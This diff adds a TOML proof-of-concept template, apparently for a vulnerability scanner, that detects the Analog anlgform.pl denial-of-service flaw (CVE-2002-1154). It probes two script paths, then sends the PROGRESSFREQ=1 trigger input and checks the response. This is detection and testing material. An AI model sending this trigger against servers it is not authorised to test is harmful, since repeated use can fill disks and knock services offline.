@@ -1,0 +1,71 @@
+[info]
+author = "AVE"
+description = "检测 Analog 日志分析工具中的 anlgform.pl CGI 脚本是否可被远程访问并执行 PROGRESSFREQ 命令，该命令缺乏访问限制，攻击者可利用其频繁报告进度导致服务器错误日志激增，最终耗尽磁盘空间造成拒绝服务"
+id = "POC-AVE-2002-0042"
+name = "Analog anlgform.pl PROGRESSFREQ DoS PoC"
+severity = "medium"
+tags = ["ave-2002-0042"]
+vuln_id = [
+    "CVE-2002-1154",
+    "AVE-2002-0042",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/anlgform.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/anlgform.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/anlgform.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "PROGRESSFREQ=1"
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Content-Type",
+    "text/html",
+]
